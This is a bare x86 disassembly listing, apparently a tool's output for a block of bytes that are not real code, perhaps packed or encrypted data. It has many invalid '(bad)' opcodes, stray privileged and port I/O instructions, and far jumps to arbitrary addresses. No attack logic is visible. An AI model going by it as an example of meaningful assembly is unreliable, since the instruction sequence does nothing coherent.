  41c065:	cmp    edi,DWORD PTR [edx-0xb]
  41c068:	push   eax
  41c069:	int    0xe8
  41c06b:	pop    eax
  41c06c:	cdq    
  41c06d:	aaa    
  41c06e:	sar    DWORD PTR [edi-0x5f],0xcd
  41c072:	stos   DWORD PTR es:[edi],eax
  41c073:	jnp    0x41c0a4
  41c075:	retf   
  41c076:	int3   
  41c077:	ja     0x41c053
  41c079:	sbb    edi,DWORD PTR [eax-0x23]
  41c07c:	push   edi
  41c07d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c07e:	xchg   edi,eax
  41c07f:	push   cs
  41c080:	ror    DWORD PTR [ebx+eiz*2],cl
  41c083:	dec    eax
  41c084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c085:	push   eax
  41c086:	sub    eax,0x728542d5
  41c08b:	cli    
  41c08c:	stos   BYTE PTR es:[edi],al
  41c08d:	shl    BYTE PTR [edx],1
  41c08f:	loopne 0x41c0b1
  41c091:	repz mov ecx,0x2aa5b699
  41c097:	cmp    edi,ebp
  41c099:	pop    ebx
  41c09a:	jns    0x41c079
  41c09c:	into   
  41c09d:	retf   0x9c64
  41c0a0:	(bad)  
  41c0a2:	mov    eax,0x9a1dd5d0
  41c0a7:	ret    0xb0d2
  41c0aa:	nop
  41c0ab:	ret    
  41c0ac:	out    dx,eax
  41c0ad:	pop    ebx
  41c0ae:	push   0x80f9a711
  41c0b3:	clc    
  41c0b4:	(bad)
  41c0b7:	cmc    
  41c0b8:	xchg   esp,eax
  41c0b9:	push   eax
  41c0ba:	out    dx,al
  41c0bb:	mov    al,ds:0xeec7cff0
  41c0c0:	mov    al,ah
  41c0c2:	add    esi,DWORD PTR [ecx-0x1f]
  41c0c5:	imul   eax,DWORD PTR [esi+0x16],0xffffffc9
  41c0c9:	retf   
  41c0ca:	dec    ecx
  41c0cb:	icebp  
  41c0cc:	ins    DWORD PTR es:[edi],dx
  41c0cd:	xchg   esp,eax
  41c0ce:	test   DWORD PTR [eax+0x56fdd537],esp
  41c0d4:	sub    cl,BYTE PTR [edi]
  41c0d6:	(bad)  
  41c0d7:	(bad)  
  41c0d8:	jo     0x41c156
  41c0da:	mov    eax,0xfd340df7
  41c0df:	and    DWORD PTR [esi+esi*8-0x3a],ebx
  41c0e3:	and    ecx,DWORD PTR [edx-0x6f4ce803]
  41c0e9:	pop    ebx
  41c0ea:	ret    0x657b
  41c0ed:	mov    eax,cs
  41c0ef:	dec    ecx
  41c0f0:	and    DWORD PTR [edi-0x1d],0xffffff9b
  41c0f4:	popa   
  41c0f5:	xchg   ecx,eax
  41c0f6:	je     0x41c171
  41c0f8:	(bad)  
  41c0f9:	push   edx
  41c0fa:	and    edx,eax
  41c0fc:	mov    cl,0xe7
  41c0fe:	jns    0x41c141
  41c100:	movlps xmm2,QWORD PTR [eax+0x770197d3]
  41c107:	mov    cl,0x35
  41c109:	addr16 pushf 
  41c10b:	fild   QWORD PTR [edi+0x4]
  41c10e:	fmul   st,st(0)
  41c110:	retf   
  41c111:	ror    DWORD PTR [edi],1
  41c113:	dec    edi
  41c114:	mov    al,ds:0x6517071f
  41c119:	and    DWORD PTR [edx+0x6c],edi
  41c11c:	out    dx,eax
  41c11d:	xchg   BYTE PTR [ecx],bh
  41c11f:	mov    BYTE PTR [ecx+0xa],cl
  41c122:	sar    DWORD PTR [ebp-0x3991488b],0x57
  41c129:	xor    DWORD PTR [edi-0x49ef02bb],0x5b51801
  41c133:	push   ebp
  41c134:	mov    bl,0x78
  41c136:	stos   DWORD PTR es:[edi],eax
  41c137:	push   ss
  41c138:	xor    cl,BYTE PTR [eax-0x6f02ba65]
  41c13e:	das    
  41c13f:	fwait
  41c140:	inc    ebp
  41c141:	stc    
  41c142:	(bad)  
  41c143:	not    DWORD PTR [edi]
  41c145:	mov    al,0x66
  41c147:	jmp    0xf41d:0xe16770f8
  41c14e:	icebp  
  41c14f:	dec    eax
  41c150:	stc    
  41c151:	cs (bad) 
  41c153:	loop   0x41c0d9
  41c155:	inc    ebx
  41c156:	adc    bl,dl
  41c158:	pop    ebx
  41c159:	dec    ebx
  41c15a:	out    dx,eax
  41c15b:	popa   
  41c15c:	dec    ebx
  41c15d:	jne    0x41c1b9
  41c15f:	repnz cmp BYTE PTR [ebp+0xb41749e],0xed
  41c167:	jmp    0xbbe6d78e
  41c16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c16d:	sbb    ecx,DWORD PTR [ecx+0x45b65352]
  41c173:	inc    edi
  41c174:	mov    ds:0x971780af,eax
  41c179:	dec    ebp
  41c17a:	jg     0x41c1a2
  41c17c:	mov    cl,0x6c
  41c17e:	outs   dx,DWORD PTR ds:[esi]
  41c17f:	or     edi,DWORD PTR [esi-0x21168051]
  41c185:	inc    ecx
  41c186:	ins    BYTE PTR es:[edi],dx
  41c187:	dec    ebp
  41c188:	test   eax,0x1c856712
  41c18d:	fnstenv [eax-0x19]
  41c190:	ja     0x41c1ae
  41c192:	jbe    0x41c119
  41c194:	mov    ds:0x3e308466,al
  41c199:	and    eax,0xc04534ba
  41c19e:	test   BYTE PTR [ebp-0x4a248adc],dh
  41c1a4:	loopne 0x41c1ba
  41c1a6:	les    edi,FWORD PTR [edi+eiz*1-0x20c729d1]
  41c1ad:	popa   
  41c1ae:	into   
  41c1af:	retf   
  41c1b0:	gs fwait
  41c1b2:	gs in  eax,dx
  41c1b4:	fld    TBYTE PTR [ecx]
  41c1b6:	jg     0x41c18c
  41c1b8:	mov    al,ds:0xd1502246
  41c1bd:	stos   DWORD PTR es:[edi],eax
  41c1be:	ja     0x41c179
  41c1c0:	push   0x7a
  41c1c2:	inc    eax
  41c1c3:	xchg   ecx,eax
  41c1c4:	mov    ecx,0xe51b7758
  41c1c9:	(bad)  
  41c1ca:	add    edi,esp
  41c1cc:	repnz pop es
  41c1ce:	int    0x20
  41c1d0:	pop    es
  41c1d1:	inc    ecx
  41c1d2:	mov    ah,0x21
  41c1d4:	add    eax,0x6f81cfcb
  41c1d9:	inc    esi
  41c1da:	inc    ecx
  41c1db:	xor    al,bh
  41c1dd:	jmp    0x2047b759
  41c1e2:	adc    al,0x0
  41c1e4:	(bad)  
  41c1e6:	sub    BYTE PTR [edx-0x2c5256be],dh
  41c1ec:	mov    eax,ds:0x27367396
  41c1f1:	adc    BYTE PTR [edi],bl
  41c1f3:	sbb    esi,DWORD PTR [ebx+0x4f]
  41c1f6:	(bad)  [ecx]
  41c1f8:	pop    edx
  41c1f9:	xor    BYTE PTR [esi],ah
  41c1fb:	jmp    0x8ca9ba5
  41c200:	test   al,0x56
  41c202:	test   al,0xd7
  41c204:	icebp  
  41c205:	gs sar ebp,1
  41c208:	mov    ebp,0x470aec1a
  41c20d:	adc    bl,bh
  41c20f:	mov    ah,0x69
  41c211:	jl     0x41c236
  41c213:	ins    DWORD PTR es:[edi],dx
  41c214:	add    esi,DWORD PTR [eax-0x5a364f54]
  41c21a:	jbe    0x41c211
  41c21c:	jge    0x41c1d5
  41c21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c21f:	mov    ch,0xd
  41c221:	xor    DWORD PTR [ebx],esi
  41c223:	mov    dl,0x47
  41c225:	xchg   BYTE PTR [esi-0x20],dl
  41c228:	hlt    
  41c229:	mov    eax,0xeae1f12b
  41c22e:	outs   dx,DWORD PTR ds:[esi]
  41c22f:	push   ss
  41c230:	pop    edi
  41c231:	hlt    
  41c232:	jmp    0x25f42a12
  41c237:	jmp    0x41c1f3
  41c239:	sub    bh,bh
  41c23b:	sbb    BYTE PTR [ecx+0x2],ch
  41c23e:	inc    esi
  41c23f:	inc    ebp
  41c240:	popa   
  41c241:	and    eax,DWORD PTR [esi-0x4eb276b2]
  41c247:	xchg   ecx,eax
  41c248:	mov    edi,0x6b232193
  41c24d:	adc    DWORD PTR [edx],edx
  41c24f:	mov    ebp,DWORD PTR [eax-0x2b432b78]
  41c255:	and    BYTE PTR [ecx-0x3afe62be],0x1d
  41c25c:	(bad)  
  41c25d:	or     DWORD PTR [ecx],edi
  41c25f:	cs and eax,0x3409f78d
  41c265:	loopne 0x41c249
  41c267:	into   
  41c268:	outs   dx,BYTE PTR ds:[esi]
  41c269:	cmp    al,0xc6
  41c26b:	push   es
  41c26c:	dec    ebx
  41c26d:	imul   ebp,DWORD PTR [eax],0x8f521039
  41c273:	add    BYTE PTR [eax+0x3a],0x22
  41c277:	or     bl,al
  41c279:	lods   eax,DWORD PTR ds:[esi]
  41c27b:	cmp    DWORD PTR [eax],ebx
  41c27d:	cwde   
  41c27e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c27f:	fild   QWORD PTR [ecx+0x39]
  41c282:	cmp    al,0x5a
  41c284:	mov    ebp,0xfccee08f
  41c289:	cmp    esp,DWORD PTR [edi+0x178de45]
  41c28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c290:	jecxz  0x41c26c
  41c292:	nop
  41c293:	and    al,0x3d
  41c295:	and    esi,DWORD PTR [ebp-0x72]
  41c298:	(bad)  
  41c299:	jge    0x41c222
  41c29b:	xor    al,0x97
  41c29d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c29e:	cmp    dh,BYTE PTR [ecx+0x2e]
  41c2a1:	test   eax,0xb56ed504
  41c2a6:	jle    0x41c2bb
  41c2a8:	push   esi
  41c2a9:	fcomp  DWORD PTR [ecx+0x5c]
  41c2ac:	fld    TBYTE PTR [eax]
  41c2ae:	fcomp  DWORD PTR [ecx]
  41c2b0:	mov    eax,ds:0xa422a851
  41c2b5:	js     0x41c30e
  41c2b7:	push   0xffffffab
  41c2b9:	test   DWORD PTR [edx+eiz*2],edi
  41c2bc:	cwde   
  41c2bd:	or     ebx,esp
  41c2bf:	mov    ebx,0x736c413b
  41c2c4:	out    0x48,al
  41c2c6:	repz sub DWORD PTR [eax],ecx
  41c2c9:	jae    0x41c334
  41c2cb:	fst    st(5)
  41c2cd:	call   0x5379:0x9779ce60
  41c2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2d5:	mov    edi,0x2b4f7b3c
  41c2da:	adc    dh,BYTE PTR [eax]
  41c2dc:	lods   eax,DWORD PTR ds:[esi]
  41c2dd:	aam    0x95
  41c2df:	jns    0x41c31d
  41c2e1:	outs   dx,BYTE PTR ds:[esi]
  41c2e2:	push   esp
  41c2e3:	inc    eax
  41c2e4:	cmp    DWORD PTR [ecx-0x4c],eax
  41c2e7:	xor    al,BYTE PTR [eax]
  41c2e9:	pop    edx
  41c2ea:	les    ecx,FWORD PTR [ebx+0x3685c82c]
  41c2f0:	cli    
  41c2f1:	jno    0x41c2f2
  41c2f3:	mov    ebp,?
  41c2f5:	ins    BYTE PTR es:[edi],dx
  41c2f6:	push   esp
  41c2f7:	dec    eax
  41c2f8:	pop    esp
  41c2f9:	ins    BYTE PTR es:[edi],dx
  41c2fa:	and    bl,BYTE PTR [ebp-0x4962d0c6]
  41c300:	mov    esi,0xea088540
  41c305:	add    ch,al
  41c307:	push   ds
  41c308:	jmp    DWORD PTR [edi]
  41c30a:	lods   al,BYTE PTR ds:[esi]
  41c30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c30c:	es popf 
  41c30e:	nop
  41c30f:	mov    esi,0xb43292db
  41c314:	nop
  41c315:	stc    
  41c316:	inc    ecx
  41c317:	mov    cl,0x14
  41c319:	inc    ecx
  41c31a:	lods   al,BYTE PTR ds:[esi]
  41c31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c31c:	mov    dl,0xad
  41c31e:	outs   dx,DWORD PTR ds:[esi]
  41c31f:	mov    al,0xaf
  41c321:	sbb    al,0x6f
  41c323:	add    ebp,ebx
  41c325:	add    ebp,eax
  41c327:	icebp  
  41c328:	stos   DWORD PTR es:[edi],eax
  41c329:	sahf   
  41c32a:	sti    
  41c32b:	jo     0x41c2b7
  41c32d:	push   0x3b518b41
  41c332:	cmp    al,0x2b
  41c334:	push   cs
  41c335:	ins    BYTE PTR es:[edi],dx
  41c336:	adc    ch,BYTE PTR [edi]
  41c338:	add    eax,0x1ede85c6
  41c33d:	sbb    ah,BYTE PTR ds:0x11544f5d
  41c343:	stos   DWORD PTR es:[edi],eax
  41c344:	and    al,0xae
  41c346:	inc    edx
  41c347:	mov    al,ds:0x98c86e4d
  41c34c:	jecxz  0x41c348
  41c34e:	mov    bl,0x75
  41c350:	xchg   BYTE PTR [ecx],al
  41c352:	xchg   DWORD PTR [edi],eax
  41c354:	or     BYTE PTR ds:0x28aa6b4b,0x25
  41c35b:	(bad)  
  41c35c:	lods   al,BYTE PTR ds:[esi]
  41c35d:	je     0x41c3b4
  41c35f:	push   ecx
  41c360:	sbb    edi,edx
  41c362:	aaa    
  41c363:	int3   
  41c364:	retf   0xfd47
  41c367:	mov    esi,0xa147304f
  41c36c:	xor    al,0xaf
  41c36e:	xor    edi,ebp
  41c370:	aad    0x75
  41c372:	out    dx,al
  41c373:	outs   dx,BYTE PTR ds:[esi]
  41c374:	daa    
  41c375:	mov    DWORD PTR [ebp-0x1e],ebx
  41c378:	in     eax,dx
  41c379:	adc    eax,0x1c6b2239
  41c37e:	cmp    ebp,DWORD PTR [ebx+0x59]
  41c381:	test   al,0x74
  41c383:	pop    ebp
  41c384:	std    
  41c385:	in     al,dx
  41c386:	and    al,0x99
  41c388:	adc    eax,0x647fb7d5
  41c38d:	jp     0x41c3ed
  41c38f:	fdiv   QWORD PTR [ecx+0x4bb5474f]
  41c395:	dec    esi
  41c396:	leave  
  41c397:	stos   BYTE PTR es:[edi],al
  41c398:	mov    al,ds:0x85207ab2
  41c39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39e:	fisub  DWORD PTR ss:[ebx+0x7b]
  41c3a2:	sti    
  41c3a3:	mov    al,0xe5
  41c3a5:	mov    fs,WORD PTR [eax]
  41c3a7:	test   al,0xf5
  41c3a9:	sub    eax,0x74cdbdbf
  41c3ae:	inc    esp
  41c3af:	int3   
  41c3b0:	dec    edx
  41c3b1:	movsx  esp,BYTE PTR [ebx-0x58]
  41c3b5:	popf   
  41c3b6:	inc    ecx
  41c3b7:	dec    ebx
  41c3b8:	pop    ebp
  41c3b9:	(bad)  
  41c3ba:	cmp    DWORD PTR [ecx],ebp
  41c3bc:	cmp    DWORD PTR [eax-0x1c],0xffffffb7
  41c3c0:	sbb    bh,BYTE PTR [ecx-0x1b]
  41c3c3:	xchg   edx,eax
  41c3c4:	(bad)  
  41c3c5:	fcom   DWORD PTR [eax+0x55]
  41c3c8:	xor    cl,dh
  41c3ca:	sbb    DWORD PTR [ecx+0x47c15334],ecx
  41c3d0:	inc    ebx
  41c3d1:	and    dl,BYTE PTR [esi+ecx*4-0xf97f8a5]
  41c3d8:	jmp    0xb32:0x8dcc74c6
  41c3df:	xchg   esp,eax
  41c3e0:	pusha  
  41c3e1:	cmc    
  41c3e2:	mov    esi,0x9d263619
  41c3e7:	repz (bad) 
  41c3ea:	push   0xffffffe8
  41c3ec:	jmp    0xcc6e:0xeb79cbe8
  41c3f3:	cmp    esp,DWORD PTR [eax+eax*2+0x6d]
  41c3f7:	mov    WORD PTR [edi+0x3816dc85],ss
  41c3fd:	lock ret 0x9aa6
  41c401:	stos   BYTE PTR es:[edi],al
  41c402:	jbe    0x41c466
  41c404:	in     al,0xb2
  41c406:	lds    edx,FWORD PTR [edi+0xf57b809]
  41c40c:	int    0x36
  41c40e:	aad    0xc9
  41c410:	dec    ebx
  41c411:	mov    ebp,0xd2d0801b
  41c416:	fsub   st(4),st
  41c418:	pop    ss
  41c419:	mov    ecx,ecx
  41c41b:	out    0xde,eax
  41c41d:	stos   BYTE PTR es:[edi],al
  41c41e:	cwde   
  41c41f:	icebp  
  41c420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c421:	push   es
  41c422:	ficomp WORD PTR [eax-0x34]
  41c425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c426:	mov    bh,0xf8
  41c428:	dec    esi
  41c429:	mov    eax,ds:0x71bf9445
  41c42e:	cmc    
  41c42f:	xchg   ebp,eax
  41c430:	pop    edi
  41c431:	je     0x41c3ea
  41c433:	(bad)  [eax+0x68]
  41c436:	loopne 0x41c485
  41c438:	xchg   BYTE PTR [edx-0xc],al
  41c43b:	xchg   ebx,eax
  41c43c:	in     al,0xef
  41c43e:	add    bh,bl
  41c440:	and    DWORD PTR [ebx+0x2e],ebp
  41c443:	adc    esp,ecx
  41c445:	scas   eax,DWORD PTR es:[edi]
  41c446:	jmp    0x41c417
  41c448:	mov    ds:0x4c01f2a7,eax
  41c44d:	inc    ebx
  41c44e:	int3   
  41c44f:	test   DWORD PTR [edx-0x6],0x800bcb9f
  41c456:	jmp    0xa7de:0x25b7f3fb
  41c45d:	xchg   DWORD PTR [edi+eiz*4-0x44],esi
  41c461:	pop    es
  41c462:	jbe    0x41c471
  41c464:	push   eax
  41c465:	sub    BYTE PTR [edx],dh
  41c467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c468:	cs (bad) 
  41c46a:	(bad)  
  41c46c:	out    0xfe,eax
  41c46e:	add    BYTE PTR [edi-0x66],dl
  41c471:	mov    al,ds:0x9cefcf18
  41c476:	sbb    bl,BYTE PTR [ebp-0x18]
  41c479:	paddsb mm6,QWORD PTR [ebp-0x3]
  41c47d:	fist   DWORD PTR [esi-0x68]
  41c480:	or     BYTE PTR [edi],al
  41c482:	(bad)  
  41c483:	sub    al,0x2e
  41c485:	nop
  41c486:	or     DWORD PTR [eax],eax
  41c488:	mov    ch,0xaa
  41c48a:	push   ecx
  41c48b:	add    edx,DWORD PTR [edx+0x6e]
  41c48e:	scas   eax,DWORD PTR es:[edi]
  41c48f:	clc    
  41c490:	add    ah,BYTE PTR [ebx+0x3dc08fc0]
  41c496:	and    DWORD PTR [edi+0x2f],0x7983219b
  41c49d:	fiadd  DWORD PTR [esp+esi*1-0x44]
  41c4a1:	xchg   edx,eax
  41c4a2:	and    al,0xf1
  41c4a4:	dec    ebp
  41c4a5:	xchg   esi,eax
  41c4a6:	adc    DWORD PTR [esi+edi*2],esp
  41c4a9:	ja     0x41c4b7
  41c4ab:	js     0x41c4ab
  41c4ad:	inc    ecx
  41c4ae:	jns    0x41c462
  41c4b0:	jmp    0x41c4c1
  41c4b2:	rcl    esi,1
  41c4b4:	repnz mov al,ds:0x4b7a779b
  41c4ba:	push   ecx
  41c4bb:	and    al,0x17
  41c4bd:	pop    ebp
  41c4be:	mov    eax,ds:0xe8fb164f
  41c4c3:	out    dx,al
  41c4c4:	imul   ebp,DWORD PTR [ecx],0x4cccc77a
  41c4ca:	outs   dx,BYTE PTR ds:[esi]
  41c4cb:	sub    DWORD PTR [edx+0x6e],0xffffffe9
  41c4cf:	nop
  41c4d0:	jb     0x41c53b
  41c4d2:	popf   
  41c4d3:	scas   al,BYTE PTR es:[edi]
  41c4d4:	aaa    
  41c4d5:	adc    esp,edi
  41c4d7:	pusha  
  41c4d8:	mov    esp,0x4a9d5feb
  41c4dd:	daa    
  41c4de:	addr16 stc 
  41c4e0:	ja     0x41c477
  41c4e2:	xor    cl,BYTE PTR [edx+0x50d1ebea]
  41c4e8:	push   DWORD PTR [ebp+0x75270550]
  41c4ee:	inc    ecx
  41c4ef:	out    dx,eax
  41c4f0:	mov    ch,0x88
  41c4f2:	mov    ch,0x0
  41c4f4:	ins    BYTE PTR es:[edi],dx
  41c4f5:	cmp    ebx,DWORD PTR [ecx+edx*4+0x55e2f914]
  41c4fc:	add    DWORD PTR [eax-0xd],edx
  41c4ff:	dec    ebp
  41c500:	pop    ecx
  41c501:	mov    ds:0xfcb7717f,eax
  41c506:	push   eax
  41c507:	pop    ebp
  41c508:	cmp    ah,BYTE PTR ds:0xd07e8fd0
  41c50e:	xchg   DWORD PTR [ebx],edx
  41c510:	push   esi
  41c511:	jecxz  0x41c4b0
  41c513:	mov    edx,0x8e4be75c
  41c518:	xor    DWORD PTR [ecx+0x6e],0xffffffad
  41c51c:	xor    DWORD PTR ds:0xaa7c3dbd,ebp
  41c522:	out    0x5a,eax
  41c524:	cwde   
  41c525:	out    0x8f,al
  41c527:	cmp    dh,dl
  41c529:	je     0x41c508
  41c52b:	adc    ecx,ebp
  41c52d:	lods   eax,DWORD PTR ds:[esi]
  41c52e:	bound  esp,QWORD PTR [esi-0x19900792]
  41c534:	enter  0x88ea,0x67
  41c538:	retf   0xb1a7
  41c53b:	enter  0xe110,0xb9
  41c53f:	push   0xffffff93
  41c541:	jne    0x41c5bc
  41c543:	outs   dx,BYTE PTR ds:[esi]
  41c544:	adc    eax,0xde89000a
  41c549:	fnsave [ebx]
  41c54b:	popa   
  41c54c:	push   es
  41c54d:	outs   dx,DWORD PTR ds:[esi]
  41c54e:	maskmovq mm2,(bad)
  41c54f:	not    DWORD PTR [ebp+esi*1-0x1a]
  41c553:	(bad)  
  41c554:	jb     0x41c53b
  41c556:	into   
  41c557:	jbe    0x41c58b
  41c559:	aam    0xa9
  41c55b:	xchg   edx,eax
  41c55c:	call   0x872f1e9
  41c561:	int3   
  41c562:	pop    esp
  41c563:	ins    DWORD PTR es:[edi],dx
  41c564:	gs sub al,0x88
  41c567:	sbb    ebp,DWORD PTR [ebx-0xbfa66bc]
  41c56d:	les    ecx,FWORD PTR [eax-0x8]
  41c570:	shr    DWORD PTR cs:[eax],0xb9
  41c574:	in     eax,0x7a
  41c576:	mov    al,ds:0xaef88e74
  41c57b:	fsub   DWORD PTR [edx+0x68]
  41c57e:	inc    ecx
  41c57f:	sbb    DWORD PTR [eax],edx
  41c581:	sub    BYTE PTR [ecx-0x5fbe9ebd],bh
  41c587:	fwait
  41c588:	clc    
  41c589:	loop   0x41c5d8
  41c58b:	dec    ebx
  41c58c:	adc    al,0x61
  41c58e:	test   DWORD PTR ds:0xff12ac43,eax
  41c594:	sub    bh,BYTE PTR [esi+0x5b]
  41c597:	mov    ah,0x4
  41c599:	mov    ds:0xebad0dd7,al
  41c59e:	rcl    BYTE PTR [edi],0x8c
  41c5a1:	pop    ss
  41c5a2:	es hlt 
  41c5a4:	xchg   edi,eax
  41c5a5:	xor    eax,DWORD PTR [esi+0x7848b103]
  41c5ab:	sbb    DWORD PTR [ebp-0x43],esi
  41c5ae:	jecxz  0x41c5b2
  41c5b0:	(bad)  
  41c5b1:	xor    eax,0x1c033bb8
  41c5b6:	dec    esp
  41c5b7:	jmp    0x41c5fb
  41c5b9:	loope  0x41c585
  41c5bb:	xor    edx,DWORD PTR [esi+0x37]
  41c5be:	fwait
  41c5bf:	imul   esp,DWORD PTR [edx+0x36517bf4],0x7a2ddd89
  41c5c9:	imul   dx,WORD PTR [ebx],0xffa1
  41c5cd:	hlt    
  41c5ce:	mov    ds:0x2b799064,al
  41c5d3:	mov    esi,0xfd670d2d
  41c5d8:	xchg   edi,eax
  41c5d9:	cdq    
  41c5da:	jl     0x41c576
  41c5dc:	or     bl,0x2c
  41c5df:	jne    0x41c573
  41c5e1:	jmp    0x41c5f5
  41c5e3:	lds    edi,FWORD PTR [esi+0x8aaad27]
  41c5e9:	pop    eax
  41c5ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5eb:	pop    edx
  41c5ec:	(bad)  
  41c5ed:	push   cs
  41c5ee:	mov    edi,0xbfed6fe4
  41c5f3:	inc    esi
  41c5f4:	(bad)  
  41c5f5:	jmp    FWORD PTR [ecx-0x4829eb98]
  41c5fb:	inc    ebx
  41c5fc:	in     eax,0x2e
  41c5fe:	fcmovnu st,st(7)
  41c600:	xor    ebx,DWORD PTR [edi-0x667f8f5]
  41c606:	jg     0x41c595
  41c608:	into   
  41c609:	mov    BYTE PTR [esi-0x56c89a32],cl
  41c60f:	ror    DWORD PTR [edx+0x37eef602],1
  41c615:	xchg   ebp,eax
  41c616:	mov    dh,0x7f
  41c618:	ins    DWORD PTR es:[edi],dx
  41c619:	and    eax,0x1f126f22
  41c61e:	inc    ecx
  41c61f:	shr    DWORD PTR [edi+ecx*8-0x1282d2e],1
  41c626:	push   esp
  41c627:	jnp    0x41c626
  41c629:	fnsave [esp+eax*8]
  41c62c:	lods   al,BYTE PTR ds:[esi]
  41c62d:	repnz pop ss
  41c62f:	xchg   BYTE PTR [ebp+0x44],bl
  41c632:	retf   0x4350
  41c635:	cmp    edi,DWORD PTR [edi-0x39]
  41c638:	ror    BYTE PTR [edx+0x614e1d09],cl
  41c63e:	jl     0x41c65e
  41c640:	dec    ecx
  41c641:	or     al,0x40
  41c643:	call   0xb19:0xcfc01fc5
  41c64a:	and    DWORD PTR [eax-0x49],ebp
  41c64d:	imul   esi,DWORD PTR [edi-0x80],0xffffffc1
  41c651:	std    
  41c652:	adc    BYTE PTR [esi+0x18171e79],dl
  41c658:	std    
  41c659:	stc    
  41c65a:	xchg   esp,eax
  41c65b:	xchg   edi,eax
  41c65c:	in     al,0x1c
  41c65e:	shl    BYTE PTR [ebx+0x5d],0xc
  41c662:	div    DWORD PTR [edi+0x3f]
  41c665:	push   esi
  41c666:	std    
  41c667:	in     al,0x77
  41c669:	das    
  41c66a:	push   es
  41c66b:	mov    esp,0x39bfc8fc
  41c670:	cmp    BYTE PTR [esi],ah
  41c672:	sbb    DWORD PTR [ebp-0x4ba5a888],0xffffffa8
  41c679:	fwait
  41c67a:	pop    edx
  41c67b:	xchg   BYTE PTR [eax-0x37],ah
  41c67e:	xchg   ebp,eax
  41c67f:	int    0x32
  41c681:	bound  esi,QWORD PTR [edi]
  41c683:	cs jne 0x41c618
  41c686:	es or  ebx,esi
  41c689:	pop    ecx
  41c68a:	and    al,0x34
  41c68c:	xchg   edx,eax
  41c68d:	pop    eax
  41c68e:	fcom   QWORD PTR [esi+0x25]
  41c691:	jno    0x41c678
  41c693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c694:	fadd   QWORD PTR [esi]
  41c696:	pop    ds
  41c697:	adc    ebp,DWORD PTR [edx]
  41c699:	sbb    eax,0x39d76636
  41c69e:	call   0xb0ffcd80
  41c6a3:	push   ss
  41c6a4:	adc    al,0xd8
  41c6a6:	xchg   edx,eax
  41c6a7:	inc    ebx
  41c6a8:	push   0xed754ff4
  41c6ad:	xor    cl,dh
  41c6af:	inc    ebx
  41c6b0:	aaa    
  41c6b1:	mov    fs,WORD PTR gs:[ebp+0x73096f54]
  41c6b8:	jns    0x41c6a2
  41c6ba:	cs aad 0xe9
  41c6bd:	cmp    al,0x11
  41c6bf:	xchg   esp,eax
  41c6c0:	jbe    0x41c6eb
  41c6c2:	and    BYTE PTR [edi+eax*8-0x13],0x90
  41c6c7:	push   ebp
  41c6c8:	lods   eax,DWORD PTR ds:[esi]
  41c6c9:	lods   eax,DWORD PTR ds:[esi]
  41c6ca:	add    DWORD PTR [edx-0x6a271548],ebp
  41c6d0:	test   eax,0xbe5a82e6
  41c6d5:	adc    edx,DWORD PTR [eax]
  41c6d7:	retf   
  41c6d8:	inc    eax
  41c6d9:	sbb    eax,0x61b7e9a
  41c6de:	or     eax,0x47c6be0b
  41c6e3:	jg     0x41c67f
  41c6e5:	mov    ah,0x1c
  41c6e7:	(bad)  
  41c6e8:	daa    
  41c6e9:	out    dx,al
  41c6ea:	in     eax,dx
  41c6eb:	mov    edi,0xe953c983
  41c6f0:	nop
  41c6f1:	cmp    al,0xc3
  41c6f3:	xor    DWORD PTR [esi],ebx
  41c6f5:	mov    WORD PTR [esi+edi*4],?
  41c6f8:	std    
  41c6f9:	out    0xd0,eax
  41c6fb:	inc    eax
  41c6fc:	mov    eax,0xa115679f
  41c701:	sub    al,bl
  41c703:	enter  0xc76b,0x4c
  41c707:	mov    ds:0x9f05c053,eax
  41c70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c70d:	cmp    BYTE PTR [esi],dl
  41c70f:	jge    0x41c76d
  41c711:	(bad)  
  41c712:	mov    WORD PTR [ebp+0x5e],?
  41c715:	hlt    
  41c716:	inc    ebx
  41c717:	xlat   BYTE PTR ds:[ebx]
  41c718:	stos   DWORD PTR es:[edi],eax
  41c719:	push   ebp
  41c71a:	lds    edi,FWORD PTR [ebx+0x4a]
  41c71d:	call   FWORD PTR [ebx+0x6e01ea73]
  41c723:	push   ebp
  41c724:	test   bh,ah
  41c726:	lods   eax,DWORD PTR ds:[esi]
  41c727:	mov    cl,0xd
  41c729:	xor    dl,BYTE PTR [eax-0x580529ec]
  41c72f:	adc    bl,BYTE PTR [eax+0x7b]
  41c732:	sbb    BYTE PTR [esi-0x21716b9b],0xaa
  41c739:	mov    eax,ds:0x28865d51
  41c73e:	cmp    eax,0x37666757
  41c743:	std    
  41c744:	mov    edx,0xb6feb087
  41c749:	pop    edi
  41c74a:	xchg   edx,eax
  41c74b:	inc    edi
  41c74c:	mov    ch,BYTE PTR [ecx-0x18]
  41c74f:	fisubr WORD PTR [esi+0x70758ba7]
  41c755:	loop   0x41c7c8
  41c757:	ret    
  41c758:	jo     0x41c6f7
  41c75a:	or     DWORD PTR [edx],edi
  41c75c:	push   ds
  41c75d:	punpckhdq mm4,QWORD PTR [ebx+0x1edddc79]
  41c764:	add    eax,0x457959ef
  41c769:	iret   
  41c76a:	hlt    
  41c76b:	xor    esp,ecx
  41c76d:	sbb    eax,0xe07479e4
  41c772:	(bad)  
  41c773:	repnz push edx
  41c775:	arpl   WORD PTR [ecx-0x68d98735],sp
  41c77b:	push   cs
  41c77c:	lahf   
  41c77d:	lods   eax,DWORD PTR ds:[esi]
  41c77e:	movntq (bad),mm6
  41c77f:	out    0xf7,eax
  41c781:	out    0xa4,eax
  41c783:	dec    esp
